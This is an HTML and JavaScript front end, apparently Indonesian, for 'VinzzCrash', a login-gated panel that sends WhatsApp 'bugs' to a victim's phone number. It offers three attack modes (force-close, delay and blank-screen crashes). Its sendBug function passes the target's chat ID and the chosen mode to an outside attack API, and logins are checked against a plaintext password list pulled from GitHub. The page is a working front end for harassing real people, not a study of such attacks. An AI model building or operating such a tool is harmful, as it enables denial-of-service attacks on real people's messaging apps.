<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>VinzzCrash</title>
  <!-- Tetap pakai icon -->
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    :root {
      --main: white;
      --second: white;
      --bg: #0e0e0e;
      --text: #eeeeee;
    }
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: sans-serif;
    }
    body {
  background: url('https://files.catbox.moe/9u3p3c.jpg') no-repeat center center fixed;
  background-size: cover;
  color: var(--text);
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 20px;
  position: relative;
}
#result {
  font-weight: bold;
  padding: 10px;
  margin-top: 10px;
  text-align: center;
  animation: fadeIn 0.5s ease-in-out;
}

@keyframes fadeIn {
  from { opacity: 0; transform: translateY(5px); }
  to   { opacity: 1; transform: translateY(0); }
}
    #particles-js {
      position: fixed;
      width: 100%;
      height: 100%;
      z-index: 0;
    }
    .glass-box {
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid white;
      border-radius: 20px;
      padding: 30px;
      backdrop-filter: blur(10px);
      box-shadow: 0 0 25px rgba(255, 255, 255, 0.1);
      z-index: 2;
      max-width: 450px;
      width: 100%;
    }
    .profile {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 10px;
      margin-bottom: 25px;
    }
    .profile img {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      border: 2px solid var(--main);
      box-shadow: 0 0 15px var(--main);
    }
    .profile-info h2 {
      font-size: 1.2rem;
      color: var(--main);
      margin-bottom: 10px;
      text-shadow: 0 0 8px var(--main);
    }
    .status {
      font-size: 0.9rem;
      color: #bbbb;
    }
    .status i {
      color: var(--main);
      margin-right: 5px;
    }
    h1 {
      font-size: 2.5rem;
      color: var(--main);
      margin-bottom: 20px;
      text-align: center;
      animation: neon 2s infinite alternate;
    }
    h3 {
      font-size: 1.4rem;
      color: #bbbb;
      margin-bottom: 20px;
      text-align: center;
    }
    .glitch {
      position: relative;
      animation: glitch 1s infinite;
    }
    @keyframes neon {
      from { text-shadow: 0 0 10px var(--main); }
      to { text-shadow: 0 0 25px var(--second); }
    }
    input, select {
      background: rgba(255, 255, 255, 0.05);
      color: white;
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 12px;
      padding: 12px;
      width: 100%;
      margin-bottom: 10px;
      transition: 0.3s;
    }
    input:focus, select:focus {
      outline: none;
      border: 1px solid var(--main);
      background: rgba(255, 255, 255, 0.1);
    }
    .bug-options {
  display: flex;
  justify-content: space-between;
  gap: 10px;
  flex-wrap: nowrap;
  margin-top: 10px;
}
.bug-card {
  flex: 1;
  text-align: center;
  padding: 12px;
  border-radius: 12px;
  background: #111;
  color: white;
  cursor: pointer;
  transition: 0.3s;
  box-shadow: 0 0 10px rgba(255, 255, 255, 1);
  border: 1px solid #444;
  min-width: 0; /* agar responsive */
}
    .bug-card i {
      font-size: 1.2rem;
      color: var(--main);
    }
    .bug-card span {
      font-size: 1rem;
      color: white;
    }
    .bug-card:hover {
      background: rgba(255, 255, 255, 0.1);
      transform: scale(1.03);
    }
    .bug-card.active {
      border: 2px solid var(--main);
      box-shadow: 0 0 12px var(--main);
    }
    button {
      background: linear-gradient(135deg, var(--main), var(--second));
      border: none;
      color: black;
      width: 100%;
      padding: 14px;
      border-radius: 50px;
      font-size: 1rem;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      box-shadow: 0 0 15px var(--main);
      transition: 0.3s;
      margin-top: 30px;
    }
    button-two {
      background: linear-gradient(135deg, var(--main), var(--second));
      border: none;
      color: black;
      width: 100%;
      padding: 14px;
      border-radius: 50px;
      font-size: 1rem;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      box-shadow: 0 0 15px var(--main);
      transition: 0.3s;
      margin-top: 10px;
    }
    .user-table-wrapper {
      max-height: 200px;
      overflow-y: auto;
      margin-top: 10px;
      border-top: 1px solid rgba(255, 255, 255, 0.1);
      padding-top: 10px;
    }
    .user-table-wrapper::-webkit-scrollbar {
      width: 6px;
    }
    .user-table-wrapper::-webkit-scrollbar-thumb {
      background: #666;
      border-radius: 10px;
    }
  </style>
</head>
<body>
  <div id="particles-js"></div>
  <div id="login-box" class="glass-box">
  <h1 style="text-align: center; color: black;">VinzzCrash</h1>
    <h3 style="color: black;">Login</h3>
    <input type="text" id="username" placeholder="Username" />
    <input type="password" id="password" placeholder="Password" />
    <button onclick="login()"><i class="fas fa-sign-in-alt"></i> Login</button>
    <div id="login-result" style="margin-top:10px; text-align:center;"></div>
    </div>

  <div class="glass-box" id="main-box" style="display:none;">
    <div class="profile">
      <img src="https://files.catbox.moe/cgfme0.jpg" alt="profile">
      <div class="profile-info">
        <h2 id="userLabel" style="text-align: center;">VinzzCrash</h2>
        <span class="status"><i class="fas fa-circle" style="color:#00ff00"></i> Server Online</span>
      </div>
    </div>
    <input type="text" id="target" placeholder="Masukkan nomor target (cth: 628xxxx" />
    <div class="bug-options">
      <div class="bug-card active" data-bug="crashtotal">
        <span>FC Invisible</span>
      </div>
      <div class="bug-card" data-bug="delay">
        <span>Invisible Delay</span>
      </div>
      <div class="bug-card" data-bug="blank">
        <span>Blank WhatsApp</span>
      </div>
    </div>
    <button id="sendBtn" onclick="sendBug()"></i> Send Bug</button>
<div id="result" style="margin-top:10px; text-align:center;"></div>
    <button onclick="logout()">Logout</button>
   </div>

<script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
<script>
particlesJS("particles-js", {
  particles: { number: { value: 60, density: { enable: true, value_area: 800 }},
  color: { value: "#ffffff" }, shape: { type: "circle" },
  opacity: { value: 0.4 }, size: { value: 3, random: true },
  line_linked: { enable: true, distance: 150, color: "#ffffff", opacity: 0.3, width: 1 },
  move: { enable: true, speed: 2, direction: "none", random: false }},
  interactivity: {
    events: { onhover: { enable: true, mode: "grab" }, onclick: { enable: false }},
    modes: { grab: { distance: 200, line_linked: { opacity: 1 } } }
  }, retina_detect: true
});

const AKUN_JSON_URL = "https://raw.githubusercontent.com/evilcrasher-ctrl/security/refs/heads/main/akunb.json"; // GANTI DENGAN URL PUNYAMU

async function getUsers() {
  try {
    const res = await fetch(AKUN_JSON_URL + "?t=" + Date.now()); // agar cache tidak nempel
    return await res.json();
  } catch (e) {
    console.error("Gagal fetch user:", e);
    return [];
  }
}

function getSession() {
  return JSON.parse(localStorage.getItem("currentUser"));
}

function saveSession(user) {
  localStorage.setItem("currentUser", JSON.stringify(user));
}

function logout() {
  localStorage.removeItem("currentUser");
  location.reload();
}

async function login() {
  const user = document.getElementById("username").value.trim();
  const pass = document.getElementById("password").value.trim();
  const result = document.getElementById("login-result");

  const users = await getUsers(); // ✅ tunggu data dari GitHub

  const found = users.find(u => u.username === user && u.password === pass);

  if (found) {
    saveSession(found);
    showDashboard(found);
  } else {
    result.innerText = "❌ Username atau Password salah!";
    result.style.color = "crimson";
  }
}

function showDashboard(user) {
  document.getElementById("login-box").style.display = "none";
  document.getElementById("main-box").style.display = "block";
  document.getElementById("userLabel").innerText = user.username;
}

let selectedBug = "crashtotal";
document.querySelectorAll(".bug-card").forEach(card => {
  card.addEventListener("click", () => {
    document.querySelectorAll(".bug-card").forEach(c => c.classList.remove("active"));
    card.classList.add("active");
    selectedBug = card.getAttribute("data-bug");
  });
});

async function sendBug() {
  const input = document.getElementById("target").value.trim();
  const resDiv = document.getElementById("result");
  const btn = document.getElementById("sendBtn");

  if (!/^\d+(@s\.whatsapp\.net)?$/.test(input)) {
    resDiv.innerText = "❌ Masukkan nomor WA valid";
    resDiv.style.color = "crimson";
    return;
  }

  const chatId = `${input}@s.whatsapp.net`;
  btn.disabled = true;
  const originalHTML = btn.innerHTML;
  btn.innerHTML = '<span class="spinner"></span> Mengirim...';
  resDiv.innerText = "";

  try {
    const res = await fetch(`https://darknes.mydigital-store.me/darknes?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`);
    if (!res.ok) throw new Error("Respon API error");
    const json = await res.json();

    resDiv.innerText = `✅ Sukses mengirim bug "${selectedBug}" ke ${input}`;
    resDiv.style.color = "#00ff99";
  } catch (err) {
    resDiv.innerText = "❌ Gagal mengirim bug: " + err.message;
    resDiv.style.color = "crimson";
  }

  btn.disabled = false;
  btn.innerHTML = originalHTML;
}
</script>
</body>
</html>
